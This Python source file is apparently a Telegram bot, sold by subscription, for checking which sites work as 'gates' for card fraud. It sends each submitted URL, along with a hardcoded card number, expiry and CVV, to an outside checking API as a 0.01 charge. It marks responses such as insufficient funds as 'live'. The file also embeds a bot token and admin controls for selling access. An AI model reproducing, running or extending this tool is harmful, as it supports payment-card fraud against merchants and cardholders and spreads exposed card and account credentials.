import os
import json
import asyncio
import httpx
from datetime import datetime, timedelta
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ========= CONFIG =========

API_TOKEN = "8407490230:AAFEnKQAZ9sREuVY3UJ7Rf2yil23TCp7eRg"
API_URL = "http://gatescheck.duckdns.org:7000/check"
CARD = "5108750403664279|02|2028|402"

# 🛠️ Main Admin ID
ADMIN_ID = 6843321125  

DB_FILE = "users_db.json"

# Global stats for Admin Panel
STATS = {
    "total_checked": 0,
    "total_live": 0,
    "total_dead": 0
}

# ========= DATABASE MANAGEMENT =========

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {}

def save_db(db_data):
    with open(DB_FILE, "w") as f:
        json.dump(db_data, f, indent=4)

db = load_db()

# ========= SECURITY & AUTHENTICATION =========

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def check_user_status(user_id: int) -> str:
    if is_admin(user_id):
        return "admin"
        
    user_str = str(user_id)
    if user_str in db:
        if db[user_str].get("blocked", False):
            return "blocked"
            
        expire_time_str = db[user_str].get("expires_at")
        if expire_time_str:
            expire_time = datetime.fromisoformat(expire_time_str)
            if datetime.now() < expire_time:
                return "active"
                
    return "expired"

def get_remaining_time(user_id: int) -> str:
    user_str = str(user_id)
    if is_admin(user_id):
        return "Lifetime Premium (Owner)"
    if user_str in db and db[user_str].get("expires_at"):
        expire_time = datetime.fromisoformat(db[user_str]["expires_at"])
        remaining = expire_time - datetime.now()
        if remaining.total_seconds() > 0:
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            return f"{days} Days, {hours} Hours, {minutes} Mins"
    return "No active subscription"

# ========= URL CLEANER & FILTER =========

def clean_url(url: str):
    url = url.strip()
    if not url:
        return None
    if not url.startswith("http"):
        url = "http://" + url
    return url

def is_link_live(result_text: str) -> bool:
    live_signals = [
        "Unknown",
        "INSUFFICIENT_FUNDS",
        "GATE ERROR TOKEN",
        "Payer cannot pay for this transaction"
    ]
    for signal in live_signals:
        if signal.lower() in result_text.lower():
            return True
    return False

# ========= API CHECK =========

async def check_url_async(client, url):
    url = clean_url(url)
    if not url:
        return "Empty"
    try:
        params = {"url": url, "card": CARD, "amount": 0.01}
        for _ in range(2):
            try:
                r = await client.get(API_URL, params=params, timeout=12)
                data = r.json()
                return data.get("result", "Unknown")
            except:
                continue
        return "API Error"
    except:
        return "Connection Error"

def read_links_file(filename):
    links = []
    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            url = clean_url(line)
            if url:
                links.append(url)
    return links

# ========= USERS COMMANDS =========

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = check_user_status(user_id)
    
    if status == "blocked":
        await update.message.reply_text("⛔ ACCESS DENIED\nYour account has been blocked.")
        return
    elif status == "expired":
        await update.message.reply_text(f"⚠️ ACCOUNT NOT ACTIVATED\n\nYour ID: {user_id}\nSend this ID to Admin.")
        return

    time_left = get_remaining_time(user_id)
    await update.message.reply_text(f"👑 WELCOME\nStatus: Premium\nTime Left: {time_left}\n\nUpload .txt file to start.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = "• /start - Status\n• /site <url> - Check one URL\n• Send .txt file for bulk check"
    await update.message.reply_text(help_text)

async def site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = check_user_status(user_id)
    if status in ["blocked", "expired"]: return

    if not context.args:
        await update.message.reply_text("Usage: /site domain.com")
        return

    url = " ".join(context.args)
    async with httpx.AsyncClient() as client:
        result = await check_url_async(client, url)
    
    await update.message.reply_text(f"🔗 URL: {url}\n📟 Response: {result}")

# ========= ADMIN COMMANDS =========

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text(f"📊 Stats:\nChecked: {STATS['total_checked']}\nLive: {STATS['total_live']}\nDead: {STATS['total_dead']}")

async def activate_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        user_target = context.args[0]
        amount = int(context.args[1])
        unit = context.args[2].lower()
        expire_date = datetime.now() + timedelta(days=amount) if unit == 'd' else datetime.now() + timedelta(hours=amount)
        db[str(user_target)] = {"expires_at": expire_date.isoformat(), "blocked": False}
        save_db(db)
        await update.message.reply_text(f"✅ Activated {user_target}")
    except:
        await update.message.reply_text("Format: /activate <id> <amount> <d/h>")

async def block_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    user_target = context.args[0]
    db[str(user_target)] = {"blocked": True}
    save_db(db)
    await update.message.reply_text(f"🚫 Blocked {user_target}")

async def unblock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    user_target = context.args[0]
    if str(user_target) in db: db[str(user_target)]["blocked"] = False
    save_db(db)
    await update.message.reply_text(f"🟢 Unblocked {user_target}")

async def revoke_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    user_target = context.args[0]
    if str(user_target) in db: db[str(user_target)]["expires_at"] = None
    save_db(db)
    await update.message.reply_text(f"⚠️ Revoked {user_target}")

# ========= FILE HANDLER (OLD VERSION - SENDS EACH SITE DIRECTLY) =========

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = check_user_status(user_id)
    if status in ["blocked", "expired"]: return

    document: Document = update.message.document
    if not document.file_name.endswith(".txt"): return

    await update.message.reply_text("⏳ Processing file... please wait...")

    file = await document.get_file()
    file_path = f"links_{user_id}.txt"
    await file.download_to_drive(file_path)

    links = read_links_file(file_path)
    
    async with httpx.AsyncClient(follow_redirects=True) as client:
        for url in links:
            result = await check_url_async(client, url)
            
            STATS["total_checked"] += 1
            if is_link_live(result):
                STATS["total_live"] += 1
            else:
                STATS["total_dead"] += 1

            # القديم بيطبع كل موقع والريسبونس بتاعه ورا بعض ف الشات علطول
            await update.message.reply_text(
                f"🔗 URL: {url}\n"
                f"📟 Response: {result}"
            )
            await asyncio.sleep(2)

    await update.message.reply_text("🏁 Done Checking File!")
    try: os.remove(file_path)
    except: pass

# ========= RUN =========

if __name__ == "__main__":
    app = ApplicationBuilder().token(API_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("site", site_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("activate", activate_user))
    app.add_handler(CommandHandler("block", block_user))
    app.add_handler(CommandHandler("unblock", unblock_user))
    app.add_handler(CommandHandler("revoke", revoke_user))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    print("Old School Bot Engine Started...")
    app.run_polling()
